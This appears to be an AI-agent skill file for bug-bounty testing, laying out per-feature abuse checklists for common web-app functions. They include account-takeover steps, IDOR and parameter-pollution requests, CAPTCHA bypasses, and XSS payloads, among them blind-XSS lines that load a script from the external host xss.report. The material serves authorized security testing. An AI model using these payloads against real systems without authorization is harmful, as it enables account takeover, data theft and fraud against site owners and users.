---
name: feature-abuse
description: Per-feature account/app abuse checklists — change password/username/phone, account deletion, logout, account linking, commenting, CAPTCHA, newsletter, product review, rich editor, social sharing, addresses, ban feature, and contact-us
---

# Feature / Function Abuse

Per-feature attack checklists for common account/app features. Open the section for whichever feature the target exposes. Prove cross-account / role / state impact before reporting. Deeper coverage of sub-classes lives in the sibling skills: idor.md, csrf.md, cors_misconfiguration.md, open_redirect.md, insecure_file_uploads.md, xss.md, oauth_sso.md/oidc_attacks.md, reset_password.md, mfa_bypass.md.

## Change Password

- **Missing rate limit on current-password field** — brute the `current_password` parameter with Intruder (ref: hackerone.com/reports/1170522).
- **Change confirmed when confirmation blank/not matching** — submit new password with confirmation left blank (ref: 803028).
- **CSRF on change** (ref: 230436).
- **IDOR / missing current-password ATO** — change email to victim, remove the `X_auth_credentials` header and `currentPassword` param, set any new password → 200 OK → log in as victim.
- **Param-injection ATO** — on `/users/{id}/edit` add `user[password]`-style fields to a name-change request.
- **2FA persistence after password change** — hold at attacker's 2FA prompt; victim resets password + disables 2FA; attacker refreshes the 2FA method ("Try another way") and completes login → session survives.
- **Old session not expiring after password change** — old login stays valid in a second browser (ref: 1166076).

## Change User Name

- **Path overwrite** — `/user/tester` → `/user/login.php` (logical path hijack).
- **Injection** — XSS via account name (ref: 34725), ATO+PII via stored XSS (ref: 1483201), self-XSS→open-redirect via unverified registration + `<meta http-equiv="Refresh" content="5;url=evil.com">`.
- **BOPLA name→email change** — add an `email` parameter to the name-change request to overwrite the account email without verification.

## Change Phone Numbers

- **Direct API reuse** — replay onboarding requests (`SetPhoneNumber`, `VerifyPhoneNumber`, `/api/v1/register/phone`) from an established session with a new number; try verb swap (POST→PUT/PATCH); keep conditional params like `"is_signup":true` / `"step":3`.
- **Parameter pollution** — inject `mobile`/`phone`/`telephone`/`contact_number` into general profile-update requests; try array/JSON wrapping.
- **GraphQL field injection** — add phone mutation fields to a standard profile-update mutation; grab introspection and look for deprecated-but-live mutations (e.g. `AddMobileNumber` left active while `SetPhoneNumber` is deprecated).
- **Cross-account OTP** — trigger `VerifyPhoneNumber` on account A, submit the OTP with account B's session.
- **Force state rollback** — unlinking a third-party login may drop the app into a re-verify/change-phone state.
- **Race conditions / replay** — concurrent update+verify requests; replay the `SetPhoneNumber`→`VerifyPhoneNumber` pair to bypass a disabled "change number" feature.

## Account Deletion

- **No re-auth** — delete without current password; try omitting `password`/`current_password`, or sending it blank/`null`/`true`/`[]`; test expired/reused re-auth token.
- **CSRF** — missing token; reuse account A's CSRF token in account B's request; Content-Type flip to `x-www-form-urlencoded`/`text/plain`.
- **CORS** — endpoint reflects `Access-Control-Allow-Origin: attacker` with credentials.
- **IDOR** — swap ID in `DELETE /api/users/12345` or `{"user_id":12345}`; batch injection `{"delete_ids":[12345,67890]}`; leak victim UUID elsewhere then feed it; param pollution `?id=my_id&id=victim_id`.
- **Logical / residual** — soft-delete data still reachable via login/reset after deletion; orphaned resources (buckets, API keys, team invites) stay active; previously generated API keys still usable after account deletion.

## Logout Feature

- **Server-side invalidation / replay** — after logout, replay a captured privileged request from Repeater (200 = still active); re-inject copied cookies; log out browser A and check browser B; verify OAuth/OIDC access+refresh tokens are actually revoked.
- **CSRF logout** — no token, or logout via GET (`<img src=".../logout">`); token omission/alteration; missing SameSite.
- **Back-button cache** — sensitive pages readable from cache after logout without re-auth.

## Account Linking

- **Response/status manipulation** — rewrite a `401`/`{"success":false}` password-confirm response to `200`/`{"success":true}`; flip `"is_verified":false`→`true` (ref: 1040373 — paste attacker's success response into victim's link flow).
- **Pre-auth OAuth linking** — create an account via a provider, then link username/password later without verifying email ownership → pre-create victim accounts.
- **Missing/static OAuth `state` (linking CSRF)** — initiate link on attacker account, capture `/oauth/callback?code=...`, send it to a logged-in victim → attacker's social account links to the victim's app account.
- **IdP email misalignment** — test provider-email ≠ app-email; secondary-identity linking without verification.
- **Race / array injection** — concurrent link of one provider account to two profiles; `{"provider_user_id":["attacker_id","victim_id"]}`.

## Social Media Links

- Unsafe handling of profile social links (ref: 2483422).
- Change username to a restricted PATH to bypass access control → IDOR.

## Commenting

- **DOM clobbering** — `<img id="getElementById">` etc. break global JS refs; via BBcode `[img id="getElementById" ...]`.
- **Markup/pixel data theft** — invisible image (iplogger.org) leaks viewer IP/UA/read-time (ref: medium a-picture-that-steals-data).
- **IDOR** — change identifier to read another user's comments.
- **Race** — post unlimited comments where only one is allowed.
- **Privilege escalation / impersonation** — tamper "verified user" flags; post comments as other users (change email to a registered/unregistered address, or change the ID).

## CAPTCHA

- Response manipulation; omit the captcha parameter; change POST↔GET / to-from JSON; send the value empty.
- Value present in page source or a cookie; reuse an old value; reuse the same value across the same/different sessionID.
- Math-captcha → automate; image-captcha with few images → detect by MD5; OCR (tesseract); services (Capsolver). Ref: bugcrowd login-captcha-bypass disclosure.

## Newsletter

- IDOR (change newsletter ID); excessive data exposure in response; CSRF on subscribe/unsubscribe.
- Injection: SQLi in email/other params; XSS/HTML injection, e.g. `?contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa`.
- Unverified user can post/create newsletter by replaying a verified user's request with unverified cookies (ref: 1691603).
- BAC by filling the form with another user's email (ref: 145396).
- No rate limit / no captcha → email spam (ref: 145612).
- Host-header injection/redirection via signup referrer attribute (ref: 229498).

## Product Review

- **Verified-purchase flip** — `"is_verified":false`→`true`, `"purchased":false`→`true`.
- **Out-of-bounds rating** — 6, 0, -1, 99999, -99999.
- **Review impersonation (IDOR)** — tamper `user_id`/`author_id`/`username`.
- **Duplicate submission / race** on rating aggregation (Turbo Intruder).
- **CSRF** on `POST /api/reviews`.
- **File upload** — bypass client-side validation for `.php/.jsp/.html/.svg/.exe`; Content-Type + magic-byte spoofing.
- **Client-side price trust** — decrease `yearly_rate`/`total_price`/`amount_due` to low/negative; flip risk flags `"is_young"`/`"high_risk"`.

## Rich Editor

- **Malformed structural tags**: `<</p>iframe src=javascript:alert()//`, `<</p>script>alert(1)</script>`; custom tags `<xss id=x onfocus=alert(1) tabindex=1>`.
- **href schemes**: `<a href="feed:javascript:alert(1)">`, entity-encoded `javascript&#x3a;alert(1)`, data-URI `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`.
- **Media/SVG**: `<img src=x onerror=alert(1)>`, `<video src=x onerror=...>`, `<svg onload=alert(1)>`.
- **Content spoofing / phishing**: `[Click to claim $100](https://evil.com)`; relative-path hijack `<a href="/../../logout">`.
- **mXSS**: `<article><script><img src=x onerror=alert(1)></script></article>`.

## Social Sharing

- **HPP / link hijack**: `?&u=https://attacker.com&text=...`; duplicate `url=valid&url=attacker`; pollute `title/description/image/thumbnail`.
- **Open redirect wrappers**: `/redirect?to=facebook&url=https://attacker.com`; path traversal `/share?url=/../../logout`.
- **DOM param extraction**: `?utm_source="><script>alert(1)</script>`; hash handling `#url=https://attacker.com`.
- **OG/Twitter-card meta injection** if input reflects into `<meta property="og:url|og:image">`.

## Addresses Management

- IDOR cross-user creation — inject `"user_id":102` / `"customer_uuid"` on `POST /api/addresses`.
- CSRF on add.
- IDOR on edit/delete — swap address ID in `PUT /api/addresses/4451` or `/address/delete?id=4451`.

## Ban Feature

- **Inbound** — can an active user invite/assign/transfer-ownership/@mention/DM a banned user (and trigger emails)? (ref: 1959219).
- **Outbound** — stale session still valid after ban; PATs/API keys not revoked; OAuth/SSO still authenticates into peripheral services.
- **Unauthenticated** — banned user can reset password, re-verify email (restoring state), open support tickets.
- **Data leakage** — `/api/v1/users/{banned_id}` still leaks PII while the UI 404s; old webhooks/Slack integrations still fire to the banned user.

## Contact Us

- No rate limit (ref: 856305); blind XSS on image-upload support chat (ref: 1010466).
- Blind XSS: `"><img src=x id=<b64> onerror=eval(atob(this.id))>`, `'"><script src=//xss.report/s/...></script>`.
- HTML/IMG injection; attachment links accessible after form submission (copy link pre-submit, open in another browser).
